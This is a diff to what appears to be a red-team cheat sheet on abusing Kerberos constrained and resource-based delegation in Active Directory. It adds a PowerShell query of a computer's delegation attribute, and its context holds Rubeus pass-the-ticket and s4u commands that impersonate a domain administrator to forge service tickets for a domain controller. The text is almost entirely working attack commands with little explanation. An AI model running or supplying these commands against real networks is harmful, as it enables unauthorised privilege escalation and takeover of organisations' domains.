@@ -35,6 +35,9 @@ execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
 ### Constrained Delegation
 **If computer account is delegated to Constrained Delegation, $ need to be added**
 ```
+ $data = (Get-DomainComputer John-activebreach.io -Properties 'msdsallowedtoactonbehalfofotheridentity').'msdsallowedtoactonbehalfofotheridentity'; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $data, 0; $Descriptor.DiscretionaryAcl | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier }
+
+
 .\Rubeus.exe s4u /user:John-activebreach.io /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /dc:10.10.10.10 /ptt "misc::cmd" 
 .\Rubeus.exe s4u /user:John-activebreach.io /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /dc:10.10.10.10 /ptt /outfile:Alice-Ticket.kirbi
 .\Rubeus.exe s4u /user:John-activebreach.io$ /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:time/DC01.Activebreach.io /dc:10.10.10.10 /ptt /outfile:Alice-Ticket.kirbi
